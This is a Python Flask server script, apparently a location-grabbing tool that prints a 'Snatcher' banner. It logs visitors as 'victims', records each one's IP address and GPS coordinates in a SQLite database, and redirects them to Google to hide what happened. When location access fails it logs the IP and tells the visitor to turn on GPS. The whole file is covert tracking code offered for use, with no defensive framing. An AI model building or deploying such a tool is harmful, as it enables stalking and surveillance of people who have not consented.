from flask import Flask,render_template,request,redirect
app = Flask('app')
import sqlite3,logging,colorama
log = logging.getLogger('werkzeug') 
log.setLevel(logging.ERROR)

con=sqlite3.connect("vic.db")
cur=con.cursor()
cur.execute('CREATE TABLE IF NOT EXISTS victims ("ip" TEXT,"cords" TEXT,"date" TEXT)')
con.commit()
con.close()

color=colorama.Fore
style=colorama.Style
print(style.BRIGHT)
print(f"""{color.MAGENTA}
 #####
#     #  #    #   ##   #####  ####  #    # ###### #####
#        ##   #  #  #    #   #    # #    # #      #    #
 #####   # #  # #    #   #   #      ###### #####  #    #
      #  #  # # ######   #   #      #    # #      #####
#     #  #   ## #    #   #   #    # #    # #      #   #
 #####   #    # #    #   #    ####  #    # ###### #    #\n\n
{color.WHITE}""")
@app.route('/')
def hello_world():
	print(color.YELLOW+"[?] VICTIM ENTERED THE MAIN PAGE, WAITING FOR FORWARDING...")
	return render_template("index.html")


@app.route('/gotcha/<lati>/<long>/<date>')
def hey(lati,long,date):
	con=sqlite3.connect("vic.db")
	cur=con.cursor()
	cur.execute("INSERT INTO victims(ip,cords,date) VALUES(?,?,?);",(request.remote_addr,long+","+lati,date))
	con.commit()
	con.close()
	print(color.GREEN+"[$] GOTCHA!")
	return redirect("https://www.google.com")


@app.route("/fail")
def fail():
	print(color.RED+f"[!] Failed to get victim's location, Their GPS might be off, Victim IP: <{request.remote_addr}>")
	return "TURN ON GPS TO CONFIRM YOUR LOCATION..."
app.run(host='0.0.0.0', port=8000)
